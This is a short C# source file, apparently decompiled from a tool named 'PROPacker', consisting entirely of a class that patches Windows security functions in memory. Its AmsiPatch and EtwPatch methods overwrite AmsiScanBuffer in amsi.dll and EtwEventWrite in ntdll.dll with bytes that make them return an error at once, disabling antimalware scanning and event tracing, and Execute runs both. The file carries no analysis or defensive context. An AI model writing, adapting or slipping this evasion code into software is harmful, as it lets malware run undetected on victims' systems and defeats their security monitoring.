using System;
using System.Runtime.InteropServices;

namespace PROPacker
{
	public class Patchers
	{
		[DllImport("kernel32", SetLastError = true)]
		private static extern IntPtr LoadLibraryA(string string_0);

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_0);

		[DllImport("kernel32", SetLastError = true)]
		private static extern bool VirtualProtect(IntPtr intptr_0, UIntPtr uintptr_0, uint uint_0, out uint uint_1);

		public static void AmsiPatch()
		{
			IntPtr intptr_ = Patchers.LoadLibraryA("amsi.dll");
			IntPtr procAddress = Patchers.GetProcAddress(intptr_, "AmsiScanBuffer");
			if (procAddress == IntPtr.Zero)
			{
				throw new InvalidOperationException("-1");
			}
			uint num;
			if (!Patchers.VirtualProtect(procAddress, (UIntPtr)5U, 64U, out num))
			{
				throw new InvalidOperationException("-1");
			}
			byte[] array = new byte[]
			{
				184,
				87,
				0,
				7,
				128,
				195
			};
			Marshal.Copy(array, 0, procAddress, array.Length);
		}

		public static void EtwPatch()
		{
			byte[] array = new byte[]
			{
				184,
				87,
				0,
				7,
				128,
				195
			};
			try
			{
				IntPtr intptr_ = Patchers.LoadLibraryA("ntdll.dll");
				IntPtr procAddress = Patchers.GetProcAddress(intptr_, "EtwEventWrite");
				if (procAddress == IntPtr.Zero)
				{
					throw new InvalidOperationException("-1");
				}
				uint num;
				if (!Patchers.VirtualProtect(procAddress, (UIntPtr)((ulong)((long)array.Length)), 64U, out num))
				{
					throw new InvalidOperationException("-1");
				}
				Marshal.Copy(array, 0, procAddress, array.Length);
			}
			catch
			{
			}
		}

		public static void Execute()
		{
			Patchers.EtwPatch();
			Patchers.AmsiPatch();
		}
	}
}
